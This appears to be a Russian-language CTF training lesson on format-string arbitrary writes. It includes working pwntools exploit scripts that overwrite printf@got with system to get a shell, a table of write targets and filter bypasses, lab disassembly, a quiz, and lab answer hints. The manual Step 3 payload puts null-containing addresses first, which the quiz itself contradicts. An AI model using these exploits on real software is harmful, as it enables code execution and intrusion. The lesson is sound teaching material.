---
id: pwn-fs-advanced
title: "Format string advanced: произвольная запись и захват GOT"
category: pwn
parent: pwn-got-plt
difficulty: hard
order: 3
tags: [format-string, %n, got-overwrite, arbitrary-write, pwntools-fmtstr]
prerequisites: [pwn-format-string, pwn-got-plt]
useful_for:
  - "CTF Pwn категория"
  - "Захват управления через запись"
  - "Vulnerability research"
estimated_minutes: 60
summary: "Превращаем %n в произвольную запись, перезаписываем GOT/адрес возврата и автоматизируем подбор смещения через fmtstr_payload pwntools."
lab:
  kind: shell
  title: "Практика: смещение format string"
  toolset: [core, objdump, readelf]
  workdir: /home/student/task
  files: [task.md, run.txt, fmt]
  check: "grep -q 'offset=6' answer.txt"
  hints:
    - "Ищи в `run.txt` значение, содержащее `41414141`."
    - "Это шестой `%p` в выводе."
    - "На x86-64 первый variadic-аргумент уходит в позицию 6."
---

## Вопрос, с которого всё начинается

В базовом уроке про format string ты научился **читать** память через `%p` и `%s` — утекать адреса. Но чтения мало. Хочется **записать** что-нибудь в память: например, заменить `printf` на `system`. Тогда следующая же `printf(buf)` выполнит `system(buf)` — и если `buf` равна `/bin/sh`, это shell.

Для записи существует спецификатор `%n`. Разберём, как превратить его в полноценную произвольную запись.

## Наш пример: printf(buf)

```c
#include <stdio.h>
int main(void) {
    char buf[64];
    fgets(buf, 64, stdin);
    printf(buf);      // format string
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    RELRO:    Partial RELRO
```

Partial RELRO — значит GOT **записываем**. Отлично, цель есть.

## Шаг 1. Как работает %n

`%n` записывает в память **число уже выведенных символов**. Если мы напечатали 42 символа и затем вызвали `%n` с указателем на `X`, то по адресу `X` запишется значение 42.

Модификаторы задают ширину записи:

| Спецификатор | Ширина | Применение |
|---|---|---|
| `%hhn` | 1 байт | побайтовая запись (основной приём) |
| `%hn` | 2 байта | компромисс |
| `%n` | 4 байта | редко |
| `%ln` | 8 байт | очень редко |

Прямая запись большого числа (`%1000000c%n`) породит гигантский вывод и замедлит всё, поэтому на практике пишут **побайтово** через `%hhn`.

## Шаг 2. Находим позицию буфера

Сначала узнаем, на какой позиции стека лежит наш буфер. Подадим метку и переберём позиции:

```python
from pwn import *
p = process('./chall')
p.sendline(b'AAAA' + b'.%p' * 30)
print(p.recvline())
```

```text
AAAA.0x7ffe... .0x2a .0x41414141 .0x7f...
```

`0x41414141` — это наши `AAAA`. Если они видны на позиции 6, значит `%6$p` читает первые 4 байта буфера, а `%6$n` запишет **по адресу, который лежит в этих байтах**. На amd64 позиция буфера обычно 6–8.

## Шаг 3. Побайтовая запись вручную

Чтобы записать 8-байтовый адрес, размещаем в начале строки 8 адресов (по одному на байт) и пишем в каждый нужный байт:

```python
from pwn import *
context.binary = elf = ELF('./chall')
target = elf.got['printf']
value  = libc.address + libc.symbols['system']

addrs = b''.join(p64(target + i) for i in range(8))
payload, written = addrs, len(addrs)
for i in range(8):
    want = (value >> (8 * i)) & 0xff
    pad  = (want - written) % 256
    payload += f'%{pad}c%{6 + i}$hhn'.encode()
    written += pad
p.sendline(payload)
```

Позиция `6+i` соответствует `i`-му адресу в буфере. Так мы пишем 8 байт адреса `system` в GOT `printf`.

## Шаг 4. Автоматизация: fmtstr_payload

pwntools делает это сам:

```python
payload = fmtstr_payload(offset, {elf.got['printf']: libc.address + libc.symbols['system']},
                         numbwritten=0, write_size='byte')
p.sendline(payload)
```

Параметры: `offset` — позиция буфера; словарь `{addr: value}` — что записать; `numbwritten` — сколько символов программа уже вывела до нашего payload (например, приглашение); `write_size` — `'byte'|'short'|'int'`. А для автоматического поиска offset есть `FmtStr`:

```python
def exec_fmt(payload):
    p = process('./chall')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
log.info('offset = %d', autofmt.offset)
```

## Шаг 5. Полный эксплойт: printf@got → system

Соберём всё вместе. Сначала утечка libc, потом запись `system` в GOT, потом подаём строку:

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

p = process('./chall')
# 1) утечка libc через printf@got
p.sendline(b'%7$s' + p64(elf.got['printf']))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['printf']
log.success('libc @ %#x', libc.address)

# 2) запись system в printf@got
p.sendline(fmtstr_payload(7, {elf.got['printf']: libc.address + libc.symbols['system']}))

# 3) следующая printf -> system
p.sendline(b'/bin/sh\x00')
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

## Шаг 6. Цели записи под разные защиты

| Цель | Когда | Заменяет |
|---|---|---|
| `printf@got` | Partial RELRO | `printf` → `system` |
| `__free_hook` | glibc < 2.34 | `free` → `system` |
| `__malloc_hook` | glibc < 2.34 | `malloc` → one_gadget |
| `.fini_array` | Full RELRO | вызов при exit |
| saved RIP | есть адрес стека | возврат в ROP |

На glibc ≥ 2.34 хуки удалены — цели смещаются на FSOP (`_IO_2_1_stdout_`) и `.fini_array`. Адрес стека для перезаписи сохранённого `rip` берут из утечки `environ` (см. `pwn-environ-leak`).

## Шаг 7. Обход фильтров

Фильтры встречаются часто:

- **Запрет `%`** — уязвимости нет, ищи другой примитив.
- **Запрет `n`** — остаётся только чтение.
- **Ограничение длины** — пиши побайтово и размещай адреса компактно.
- **Фильтр на `$`** — используй последовательные `%p` вместо позиционных.
- **Фильтр на нулевые байты** — размещай адреса так, чтобы нули не обрывали строку.

## Шаг 8. Одновременная запись нескольких целей

`fmtstr_payload` умеет писать сразу в несколько адресов — передай словарь с несколькими парами. Это нужно, например, когда для shell требуется записать `system` в GOT и одновременно подготовить строку `/bin/sh` в записываемой памяти (или переписать две записи GOT). Порядок адресов в payload определяется сортировкой по значениям байтов: pwntools сам выстраивает их так, чтобы число выведенных символов монотонно росло. Если пишешь вручную, помни: `%hhn` записывает младший байт текущего счётчика, поэтому байты должны идти в порядке неубывания, а «перескоки» компенсируются паддингом `%Nc`. При нескольких целях следи, чтобы адреса не пересекались и не портили друг друга.

## На что смотреть дальше

- **Неверный offset** — перепроверяй его после смены payload.
- **Забытый `numbwritten`** — приглашение программы уже вывело символы, их надо учесть.
- **Порядок байт** — адреса в payload идут в порядке записи; значения должны возрастать.
- **`%n` пишет 4 байта** — для одного байта используй `%hhn`, иначе затрёшь соседнюю память.
- **Full RELRO** — GOT read-only, целься в `.fini_array`/`__exit_funcs`.
- **Огромный вывод** — `%1000000c` замедлит и оборвёт вывод; пиши побайтово.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

### Рабочий пример (как в лаборатории)

```
$ nm fmt
0000000000403df8 d _DYNAMIC
0000000000403fe8 d _GLOBAL_OFFSET_TABLE_
0000000000402000 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
00000000004020b8 r __FRAME_END__
0000000000402004 r __GNU_EH_FRAME_HDR
0000000000404020 D __TMC_END__
0000000000402100 r __abi_tag
0000000000404020 B __bss_start
0000000000404010 D __data_start
0000000000401100 t __do_global_dtors_aux
0000000000403df0 d __do_global_dtors_aux_fini_array_entry
0000000000404018 D __dso_handle
0000000000403de8 d __frame_dummy_init_array_entry
                 w __gmon_start__
                 U __libc_start_main@GLIBC_2.34
0000000000401080 T _dl_relocate_static_pie
0000000000404020 D _edata
0000000000404028 B _end
0000000000401194 T _fini
0000000000401000 T _init
0000000000401050 T _start
0000000000404020 b completed.0
0000000000404010 W data_start
0000000000401090 t deregister_tm_clones
0000000000401130 t frame_dummy
0000000000401136 T main
                 U printf@GLIBC_2.2.5
                 U read@GLIBC_2.2.5
00000000004010c0 t register_tm_clones
```

Подсказка из лаборатории: `nm [-D] <файл>`.

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

### Рабочий пример (как в лаборатории)

```
$ objdump -d fmt

fmt:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64
  401004:	48 83 ec 08          	sub    $0x8,%rsp
  401008:	48 8b 05 c9 2f 00 00 	mov    0x2fc9(%rip),%rax        # 403fd8 <__gmon_start__>
  40100f:	48 85 c0             	test   %rax,%rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   *%rax
  401016:	48 83 c4 08          	add    $0x8,%rsp
  40101a:	c3                   	ret

Disassembly of section .plt:

0000000000401020 <printf@plt-0x10>:
  401020:	ff 35 ca 2f 00 00    	push   0x2fca(%rip)        # 403ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	ff 25 cc 2f 00 00    	jmp    *0x2fcc(%rip)        # 403ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401030 <printf@plt>:
  401030:	ff 25 ca 2f 00 00    	jmp    *0x2fca(%rip)        # 404000 <printf@GLIBC_2.2.5>
  401036:	68 00 00 00 00       	push   $0x0
  40103b:	e9 e0 ff ff ff       	jmp    401020 <_init+0x20>

0000000000401040 <read@plt>:
  401040:	ff 25 c2 2f 00 00    	jmp    *0x2fc2(%rip)        # 404008 <read@GLIBC_2.2.5>
  401046:	68 01 00 00 00       	push   $0x1
  40104b:	e9 d0 ff ff ff       	jmp    401020 <_init+0x20>

Disassembly of section .text:

0000000000401050 <_start>:
  401050:	f3 0f 1e fa          	endbr64
  401054:	31 ed                	xor    %ebp,%ebp
  401056:	49 89 d1             	mov    %rdx,%r9
  401059:	5e                   	pop    %rsi
  40105a:	48 89 e2             	mov    %rsp,%rdx
  40105d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  401061:	50                   	push   %rax
  401062:	54                   	push   %rsp
  401063:	45 31 c0             	xor    %r8d,%r8d
  401066:	31 c9                	xor    %ecx,%ecx
  401068:	48 c7 c7 36 11 40 00 	mov    $0x401136,%rdi
  40106f:	ff 15 53 2f 00 00    	call   *0x2f53(%rip)        # 403fc8 <__libc_start_main@GLIBC_2.34>
  401075:	f4                   	hlt
  401076:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40107d:	00 00 00 

0000000000401080 <_dl_relocate_static_pie>:
  401080:	f3 0f 1e fa          	endbr64
  401084:	c3                   	ret
  401085:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40108c:	00 00 00 
  40108f:	90                   	nop

0000000000401090 <deregister_tm_clones>:
  401090:	b8 20 40 40 00       	mov    $0x404020,%eax
  401095:	48 3d 20 40 40 00    	cmp    $0x404020,%rax
  40109b:	74 13                	je     4010b0 <deregister_tm_clones+0x20>
  40109d:	48 8b 05 2c 2f 00 00 	mov    0x2f2c(%rip),%rax        # 403fd0 <_ITM_deregisterTMCloneTable>
  4010a4:	48 85 c0             	test   %rax,%rax
  4010a7:	74 07                	je     4010b0 <deregister_tm_clones+0x20>
  4010a9:	bf 20 40 40 00       	mov    $0x404020,%edi
  4010ae:	ff e0                	jmp    *%rax
  4010b0:	c3                   	ret
  4010b1:	0f 1f 40 00          	nopl   0x0(%rax)
  4010b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4010bc:	00 00 00 00 

00000000004010c0 <register_tm_clones>:
  4010c0:	be 20 40 40 00       	mov    $0x404020,%esi
  4010c5:	48 81 ee 20 40 40 00 	sub    $0x404020,%rsi
  4010cc:	48 89 f0             	mov    %rsi,%rax
  4010cf:	48 c1 ee 3f          	shr    $0x3f,%rsi
  4010d3:	48 c1 f8 03          	sar    $0x3,%rax
  4010d7:	48 01 c6             	add    %rax,%rsi
  4010da:	48 d1 fe             	sar    $1,%rsi
  4010dd:	74 19                	je     4010f8 <register_tm_clones+0x38>
  4010df:	48 8b 05 fa 2e 00 00 	mov    0x2efa(%rip),%rax        # 403fe0 <_ITM_registerTMCloneTable>
  4010e6:	48 85 c0             	test   %rax,%rax
  4010e9:	74 0d                	je     4010f8 <register_tm_clones+0x38>
  4010eb:	bf 20 40 40 00       	mov    $0x404020,%edi
  4010f0:	ff e0                	jmp    *%rax
  4010f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4010f8:	c3                   	ret
  4010f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401100 <__do_global_dtors_aux>:
  401100:	f3 0f 1e fa          	endbr64
  401104:	80 3d 15 2f 00 00 00 	cmpb   $0x0,0x2f15(%rip)        # 404020 <__TMC_END__>
  40110b:	75 13                	jne    401120 <__do_global_dtors_aux+0x20>
  40110d:	55                   	push   %rbp
  40110e:	48 89 e5             	mov    %rsp,%rbp
  401111:	e8 7a ff ff ff       	call   401090 <deregister_tm_clones>
  401116:	c6 05 03 2f 00 00 01 	movb   $0x1,0x2f03(%rip)        # 404020 <__TMC_END__>
  40111d:	5d                   	pop    %rbp
  40111e:	c3                   	ret
  40111f:	90                   	nop
  401120:	c3                   	ret
  401121:	0f 1f 40 00          	nopl   0x0(%rax)
  401125:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  40112c:	00 00 00 00 

0000000000401130 <frame_dummy>:
  401130:	f3 0f 1e fa          	endbr64
  401134:	eb 8a                	jmp    4010c0 <register_tm_clones>

0000000000401136 <main>:
  401136:	55                   	push   %rbp
  401137:	48 89 e5             	mov    %rsp,%rbp
  40113a:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
  401141:	48 8d 85 f0 fe ff ff 	lea    -0x110(%rbp),%rax
  401148:	ba ff 00 00 00       	mov    $0xff,%edx
  40114d:	48 89 c6             	mov    %rax,%rsi
  401150:	bf 00 00 00 00       	mov    $0x0,%edi
  401155:	e8 e6 fe ff ff       	call   401040 <read@plt>
  40115a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40115e:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  401163:	7e 25                	jle    40118a <main+0x54>
  401165:	48 8d 95 f0 fe ff ff 	lea    -0x110(%rbp),%rdx
  40116c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401170:	48 01 d0             	add    %rdx,%rax
  401173:	c6 00 00             	movb   $0x0,(%rax)
  401176:	48 8d 85 f0 fe ff ff 	lea    -0x110(%rbp),%rax
  40117d:	48 89 c7             	mov    %rax,%rdi
  401180:	b8 00 00 00 00       	mov    $0x0,%eax
  401185:	e8 a6 fe ff ff       	call   401030 <printf@plt>
  40118a:	b8 00 00 00 00       	mov    $0x0,%eax
  40118f:	c9                   	leave
  401190:	c3                   	ret

Disassembly of section .fini:

0000000000401194 <_fini>:
  401194:	f3 0f 1e fa          	endbr64
  401198:	48 83 ec 08          	sub    $0x8,%rsp
  40119c:	48 83 c4 08          	add    $0x8,%rsp
  4011a0:	c3                   	ret
```

Подсказка из лаборатории: `objdump [-d] <файл>`.

## Инструмент: readelf — разбор ELF

`readelf` читает заголовки ELF-файла: архитектуру, тип, секции, сегменты и включённые защиты. С него начинается любой разбор нативного бинарника.

Ключи, которые пригодятся:
* `readelf -h <файл>` — заголовок: класс (32/64), машина, точка входа;
* `readelf -S <файл>` — таблица секций (`.text`, `.plt`, `.got`, `.data`);
* `readelf -s <файл>` — таблица символов (как `nm`, но с секциями и типами);
* `readelf -l <файл>` — сегменты программы; ищи `GNU_STACK`/`GNU_RELRO`, чтобы понять защиты.

### Рабочий пример (как в лаборатории)

```
$ readelf -r fmt

Relocation section '.rela.dyn' at offset 0x520 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fc8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403fd0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
000000403fd8  000500000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000403fe0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0

Relocation section '.rela.plt' at offset 0x580 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404000  000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404008  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
```

Подсказка из лаборатории: `readelf [-r|-s|-h] <файл>`.

## Что мы теперь знаем

- `%n` пишет число выведенных символов по указателю — это и есть запись.
- `%hhn`/`%hn` дают побайтовую/по-словную запись.
- Позицию буфера находят перебором `%p` или через `FmtStr`.
- `fmtstr_payload(offset, {addr: value})` автоматизирует сборку payload.
- Цель записи зависит от RELRO: GOT, хуки или `.fini_array`.

Освоив произвольную запись, ты закрываешь большинство format string задач: одна удачная запись `system` в GOT превращает уязвимость в RCE.

## Квиз

Проверь себя.

```quiz
- question: "Что записывает %hhn?"
  options:
    - "Один байт (число напечатанных байт) по указателю"
    - "Строку"
    - "Указатель"
    - "Ничего"
  answer: 0
  explanation: "%hhn пишет младший байт счётчика, что удобно для точной записи."
- question: "Зачем разбивать значение на байты/слова?"
  options:
    - "Чтобы не печатать миллиарды символов для %n"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "%hn/%hhn позволяют записывать 2/1 байт с малым счётчиком."
- question: "Какая функция pwntools строит payload для записи?"
  options:
    - "fmtstr_payload"
    - "cyclic"
    - "Ret2dlresolvePayload"
    - "shellcraft"
  answer: 0
  explanation: "fmtstr_payload(offset, {addr: value}) автоматизирует запись."
- question: "Куда целиться при Full RELRO?"
  options:
    - "В .fini_array, exit-обработчики или saved RIP (GOT read-only)"
    - "В GOT"
    - "В canary"
    - "В tcache"
  answer: 0
  explanation: "Full RELRO делает GOT read-only; нужны другие цели записи."
- question: "Почему адреса размещают после спецификаторов?"
  options:
    - "Адрес может содержать \\x00, который обрывает строку"
    - "Так короче"
    - "Иначе не сработает %s"
    - "Так требует libc"
  answer: 0
  explanation: "Нулевые байты в адресе обрывают ввод; адрес кладут в конец."
```

## Куда дальше

Дальше — `pwn-mitigations`: системная карта всех защит (NX, ASLR, PIE, canary, RELRO, CET, seccomp) и того, какую технику выбирать под каждую. А пока главное: **`%n` превращает format string в произвольную запись, а `fmtstr_payload` собирает payload, который переписывает GOT и захватывает управление.**

## Где пригодится

- **CTF:** Pwn — захват GOT и управления через запись.
- **Bug bounty:** эксплуатация форматных строк.
- **Пентест:** разработка эксплойтов.
- **Работа:** vulnerability research.
